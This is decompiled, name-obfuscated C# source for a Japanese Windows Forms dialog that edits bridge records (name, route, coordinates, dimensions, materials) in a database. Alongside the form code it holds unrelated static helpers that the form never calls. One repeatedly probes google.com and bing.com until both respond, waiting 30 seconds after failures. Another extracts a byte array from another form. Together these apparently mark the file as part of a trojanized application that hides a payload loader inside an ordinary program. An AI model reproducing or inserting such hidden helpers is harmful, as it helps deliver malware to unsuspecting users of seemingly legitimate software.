using System;
using System.ComponentModel;
using System.Data.Entity;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using As4;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Nw8;
using Yn1g;

namespace So01;

[DesignerGenerated]
public class m4S0 : Form
{
	private IContainer components;

	private Lk0 db;

	private e5R bridgeManagementViewForm;

	[field: AccessedThroughProperty("uppermaterial")]
	internal virtual TextBox uppermaterial
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label13")]
	internal virtual Label Label13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bridgestructure")]
	internal virtual TextBox bridgestructure
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label12")]
	internal virtual Label Label12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("span")]
	internal virtual TextBox span
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label11")]
	internal virtual Label Label11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bridgewidth")]
	internal virtual TextBox bridgewidth
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bridgelength")]
	internal virtual TextBox bridgelength
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("made")]
	internal virtual TextBox made
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("longitude")]
	internal virtual TextBox longitude
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("latitude")]
	internal virtual TextBox latitude
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("address")]
	internal virtual TextBox address
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("route")]
	internal virtual TextBox route
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bridgenameruby")]
	internal virtual TextBox bridgenameruby
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bridgename")]
	internal virtual TextBox bridgename
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("id")]
	internal virtual TextBox id
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("emergencyroad")]
	internal virtual TextBox emergencyroad
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label18")]
	internal virtual Label Label18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("undercondition")]
	internal virtual TextBox undercondition
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label19")]
	internal virtual Label Label19
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lowermaterial")]
	internal virtual TextBox lowermaterial
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label20")]
	internal virtual Label Label20
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("BridgeBindingSource")]
	internal virtual BindingSource BridgeBindingSource
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button editBridgeButton
	{
		[CompilerGenerated]
		get
		{
			return _editBridgeButton;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Zz03;
			Button val = _editBridgeButton;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_editBridgeButton = value;
			val = _editBridgeButton;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public m4S0()
	{
		db = new Lk0();
		o2BZ();
	}

	[DebuggerNonUserCode]
	protected override void g8S7(bool Gz86)
	{
		try
		{
			if (Gz86 && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Gz86);
		}
	}

	[DebuggerStepThrough]
	private void o2BZ()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_0171: Expected O, but got Unknown
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_01b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Expected O, but got Unknown
		//IL_02a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ab: Expected O, but got Unknown
		//IL_0380: Unknown result type (might be due to invalid IL or missing references)
		//IL_038a: Expected O, but got Unknown
		//IL_045f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0469: Expected O, but got Unknown
		//IL_053e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0548: Expected O, but got Unknown
		//IL_0616: Unknown result type (might be due to invalid IL or missing references)
		//IL_0620: Expected O, but got Unknown
		//IL_06ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f8: Expected O, but got Unknown
		//IL_07c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07d0: Expected O, but got Unknown
		//IL_089e: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a8: Expected O, but got Unknown
		//IL_0976: Unknown result type (might be due to invalid IL or missing references)
		//IL_0980: Expected O, but got Unknown
		//IL_0a4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a58: Expected O, but got Unknown
		//IL_0b20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b2a: Expected O, but got Unknown
		//IL_0bf9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c03: Expected O, but got Unknown
		//IL_0cd7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ce1: Expected O, but got Unknown
		//IL_0daf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0db9: Expected O, but got Unknown
		//IL_0e87: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e91: Expected O, but got Unknown
		components = new Container();
		uppermaterial = new TextBox();
		BridgeBindingSource = new BindingSource(components);
		Label13 = new Label();
		bridgestructure = new TextBox();
		Label12 = new Label();
		span = new TextBox();
		Label11 = new Label();
		bridgewidth = new TextBox();
		Label10 = new Label();
		bridgelength = new TextBox();
		Label9 = new Label();
		made = new TextBox();
		Label8 = new Label();
		longitude = new TextBox();
		Label7 = new Label();
		latitude = new TextBox();
		Label6 = new Label();
		address = new TextBox();
		Label5 = new Label();
		route = new TextBox();
		Label4 = new Label();
		bridgenameruby = new TextBox();
		Label3 = new Label();
		bridgename = new TextBox();
		Label2 = new Label();
		id = new TextBox();
		Label1 = new Label();
		emergencyroad = new TextBox();
		Label18 = new Label();
		undercondition = new TextBox();
		Label19 = new Label();
		lowermaterial = new TextBox();
		Label20 = new Label();
		editBridgeButton = new Button();
		((ISupportInitialize)BridgeBindingSource).BeginInit();
		((Control)this).SuspendLayout();
		((Control)uppermaterial).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "uppermaterial", true));
		((Control)uppermaterial).set_Location(new Point(182, 571));
		((Control)uppermaterial).set_Name("uppermaterial");
		((Control)uppermaterial).set_Size(new Size(220, 19));
		((Control)uppermaterial).set_TabIndex(51);
		BridgeBindingSource.set_DataSource((object)typeof(Fp0s));
		Label13.set_AutoSize(true);
		((Control)Label13).set_Location(new Point(52, 571));
		((Control)Label13).set_Name("Label13");
		((Control)Label13).set_Size(new Size(89, 12));
		((Control)Label13).set_TabIndex(50);
		Label13.set_Text("上部工使用材料");
		((Control)bridgestructure).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "bridgestructure", true));
		((Control)bridgestructure).set_Location(new Point(182, 526));
		((Control)bridgestructure).set_Name("bridgestructure");
		((Control)bridgestructure).set_Size(new Size(220, 19));
		((Control)bridgestructure).set_TabIndex(49);
		Label12.set_AutoSize(true);
		((Control)Label12).set_Location(new Point(52, 526));
		((Control)Label12).set_Name("Label12");
		((Control)Label12).set_Size(new Size(53, 12));
		((Control)Label12).set_TabIndex(48);
		Label12.set_Text("構造形式");
		((Control)span).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "span", true, (DataSourceUpdateMode)0, (object)null, "N0"));
		((Control)span).set_Location(new Point(182, 480));
		((Control)span).set_Name("span");
		((Control)span).set_Size(new Size(220, 19));
		((Control)span).set_TabIndex(47);
		Label11.set_AutoSize(true);
		((Control)Label11).set_Location(new Point(52, 480));
		((Control)Label11).set_Name("Label11");
		((Control)Label11).set_Size(new Size(41, 12));
		((Control)Label11).set_TabIndex(46);
		Label11.set_Text("径間数");
		((Control)bridgewidth).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "bridgewidth", true, (DataSourceUpdateMode)0, (object)null, "N1"));
		((Control)bridgewidth).set_Location(new Point(182, 434));
		((Control)bridgewidth).set_Name("bridgewidth");
		((Control)bridgewidth).set_Size(new Size(220, 19));
		((Control)bridgewidth).set_TabIndex(45);
		Label10.set_AutoSize(true);
		((Control)Label10).set_Location(new Point(52, 434));
		((Control)Label10).set_Name("Label10");
		((Control)Label10).set_Size(new Size(29, 12));
		((Control)Label10).set_TabIndex(44);
		Label10.set_Text("幅員");
		((Control)bridgelength).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "bridgelength", true, (DataSourceUpdateMode)0, (object)null, "N1"));
		((Control)bridgelength).set_Location(new Point(182, 392));
		((Control)bridgelength).set_Name("bridgelength");
		((Control)bridgelength).set_Size(new Size(220, 19));
		((Control)bridgelength).set_TabIndex(43);
		Label9.set_AutoSize(true);
		((Control)Label9).set_Location(new Point(52, 392));
		((Control)Label9).set_Name("Label9");
		((Control)Label9).set_Size(new Size(29, 12));
		((Control)Label9).set_TabIndex(42);
		Label9.set_Text("橋長");
		((Control)made).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "made", true));
		((Control)made).set_Location(new Point(182, 345));
		((Control)made).set_Name("made");
		((Control)made).set_Size(new Size(220, 19));
		((Control)made).set_TabIndex(41);
		Label8.set_AutoSize(true);
		((Control)Label8).set_Location(new Point(52, 345));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(53, 12));
		((Control)Label8).set_TabIndex(40);
		Label8.set_Text("架設年次");
		((Control)longitude).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "longitude", true));
		((Control)longitude).set_Location(new Point(182, 302));
		((Control)longitude).set_Name("longitude");
		((Control)longitude).set_Size(new Size(220, 19));
		((Control)longitude).set_TabIndex(39);
		Label7.set_AutoSize(true);
		((Control)Label7).set_Location(new Point(52, 302));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(29, 12));
		((Control)Label7).set_TabIndex(38);
		Label7.set_Text("経度");
		((Control)latitude).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "latitude", true));
		((Control)latitude).set_Location(new Point(182, 254));
		((Control)latitude).set_Name("latitude");
		((Control)latitude).set_Size(new Size(220, 19));
		((Control)latitude).set_TabIndex(37);
		Label6.set_AutoSize(true);
		((Control)Label6).set_Location(new Point(52, 254));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(29, 12));
		((Control)Label6).set_TabIndex(36);
		Label6.set_Text("緯度");
		((Control)address).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "address", true));
		((Control)address).set_Location(new Point(182, 202));
		((Control)address).set_Name("address");
		((Control)address).set_Size(new Size(220, 19));
		((Control)address).set_TabIndex(35);
		Label5.set_AutoSize(true);
		((Control)Label5).set_Location(new Point(52, 202));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(41, 12));
		((Control)Label5).set_TabIndex(34);
		Label5.set_Text("所在地");
		((Control)route).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "route", true));
		((Control)route).set_Location(new Point(182, 156));
		((Control)route).set_Name("route");
		((Control)route).set_Size(new Size(220, 19));
		((Control)route).set_TabIndex(33);
		Label4.set_AutoSize(true);
		((Control)Label4).set_Location(new Point(52, 156));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(41, 12));
		((Control)Label4).set_TabIndex(32);
		Label4.set_Text("路線名");
		((Control)bridgenameruby).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "bridgenameruby", true));
		((Control)bridgenameruby).set_Location(new Point(182, 108));
		((Control)bridgenameruby).set_Name("bridgenameruby");
		((Control)bridgenameruby).set_Size(new Size(220, 19));
		((Control)bridgenameruby).set_TabIndex(31);
		Label3.set_AutoSize(true);
		((Control)Label3).set_Location(new Point(52, 108));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(80, 12));
		((Control)Label3).set_TabIndex(30);
		Label3.set_Text("道路橋名(カナ)");
		((Control)bridgename).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "bridgename", true));
		((Control)bridgename).set_Location(new Point(182, 65));
		((Control)bridgename).set_Name("bridgename");
		((Control)bridgename).set_Size(new Size(220, 19));
		((Control)bridgename).set_TabIndex(29);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Location(new Point(52, 65));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(53, 12));
		((Control)Label2).set_TabIndex(28);
		Label2.set_Text("道路橋名");
		((Control)id).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "id", true, (DataSourceUpdateMode)0, (object)null, "N0"));
		((Control)id).set_Enabled(false);
		((Control)id).set_Location(new Point(182, 24));
		((Control)id).set_Name("id");
		((Control)id).set_Size(new Size(220, 19));
		((Control)id).set_TabIndex(27);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Location(new Point(52, 24));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(89, 12));
		((Control)Label1).set_TabIndex(26);
		Label1.set_Text("国交省作業番号");
		((Control)emergencyroad).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "emergencyroad", true));
		((Control)emergencyroad).set_Location(new Point(182, 700));
		((Control)emergencyroad).set_Name("emergencyroad");
		((Control)emergencyroad).set_Size(new Size(220, 19));
		((Control)emergencyroad).set_TabIndex(57);
		Label18.set_AutoSize(true);
		((Control)Label18).set_Location(new Point(52, 700));
		((Control)Label18).set_Name("Label18");
		((Control)Label18).set_Size(new Size(77, 12));
		((Control)Label18).set_TabIndex(56);
		Label18.set_Text("緊急輸送道路");
		((Control)undercondition).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "undercondition", true));
		((Control)undercondition).set_Location(new Point(182, 657));
		((Control)undercondition).set_Name("undercondition");
		((Control)undercondition).set_Size(new Size(220, 19));
		((Control)undercondition).set_TabIndex(55);
		Label19.set_AutoSize(true);
		((Control)Label19).set_Location(new Point(52, 657));
		((Control)Label19).set_Name("Label19");
		((Control)Label19).set_Size(new Size(53, 12));
		((Control)Label19).set_TabIndex(54);
		Label19.set_Text("路下条件");
		((Control)lowermaterial).get_DataBindings().Add(new Binding("Text", (object)BridgeBindingSource, "lowermaterial", true));
		((Control)lowermaterial).set_Location(new Point(182, 616));
		((Control)lowermaterial).set_Name("lowermaterial");
		((Control)lowermaterial).set_Size(new Size(220, 19));
		((Control)lowermaterial).set_TabIndex(53);
		Label20.set_AutoSize(true);
		((Control)Label20).set_Location(new Point(52, 616));
		((Control)Label20).set_Name("Label20");
		((Control)Label20).set_Size(new Size(53, 12));
		((Control)Label20).set_TabIndex(52);
		Label20.set_Text("床板材料");
		((Control)editBridgeButton).set_Location(new Point(66, 750));
		((Control)editBridgeButton).set_Name("editBridgeButton");
		((Control)editBridgeButton).set_Size(new Size(75, 23));
		((Control)editBridgeButton).set_TabIndex(58);
		((ButtonBase)editBridgeButton).set_Text("編集");
		((ButtonBase)editBridgeButton).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(483, 785));
		((Control)this).get_Controls().Add((Control)(object)editBridgeButton);
		((Control)this).get_Controls().Add((Control)(object)emergencyroad);
		((Control)this).get_Controls().Add((Control)(object)Label18);
		((Control)this).get_Controls().Add((Control)(object)undercondition);
		((Control)this).get_Controls().Add((Control)(object)Label19);
		((Control)this).get_Controls().Add((Control)(object)lowermaterial);
		((Control)this).get_Controls().Add((Control)(object)Label20);
		((Control)this).get_Controls().Add((Control)(object)uppermaterial);
		((Control)this).get_Controls().Add((Control)(object)Label13);
		((Control)this).get_Controls().Add((Control)(object)bridgestructure);
		((Control)this).get_Controls().Add((Control)(object)Label12);
		((Control)this).get_Controls().Add((Control)(object)span);
		((Control)this).get_Controls().Add((Control)(object)Label11);
		((Control)this).get_Controls().Add((Control)(object)bridgewidth);
		((Control)this).get_Controls().Add((Control)(object)Label10);
		((Control)this).get_Controls().Add((Control)(object)bridgelength);
		((Control)this).get_Controls().Add((Control)(object)Label9);
		((Control)this).get_Controls().Add((Control)(object)made);
		((Control)this).get_Controls().Add((Control)(object)Label8);
		((Control)this).get_Controls().Add((Control)(object)longitude);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)latitude);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)address);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)route);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)bridgenameruby);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)bridgename);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)id);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).set_Name("BridgeEditForm");
		((Form)this).set_Text("橋梁編集");
		((ISupportInitialize)BridgeBindingSource).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public void Lz80(int Aw9a)
	{
		BridgeBindingSource.Add((object)db.bridge.Find(new object[1] { Aw9a }));
	}

	public void Gt4r(e5R t9AD)
	{
		bridgeManagementViewForm = t9AD;
	}

	internal static bool n7C4(string Gm6o)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(Gm6o);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	private void Zz03(object sender, EventArgs e)
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Fp0s fp0s = (Fp0s)BridgeBindingSource.get_Current();
			fp0s.recorddate = DateAndTime.get_Now();
			fp0s.recordprogram = ((Control)this).get_Name();
			fp0s.recorduserid = Environment.UserName;
			fp0s.recordvalid = true;
			BridgeBindingSource.EndEdit();
			((DbContext)db).SaveChanges();
			((Form)this).Close();
			bridgeManagementViewForm.b0Q();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static bool e4L9()
	{
		string[] array = new string[2] { "https://www.google.com/", "https://www.bing.com/" };
		int num = 0;
		checked
		{
			while (num != 2)
			{
				string[] array2 = array;
				foreach (string gm6o in array2)
				{
					if (!n7C4(gm6o))
					{
						if (num > 0)
						{
							num--;
						}
						Task.Delay(30000).Wait();
					}
					else
					{
						num++;
					}
				}
			}
			if (num == 2)
			{
				return true;
			}
			return false;
		}
	}

	internal static byte[] b9R8(int Ef29)
	{
		return e5R.Pd6(Ef29, checked(Ef29 + 1 - 51));
	}
}
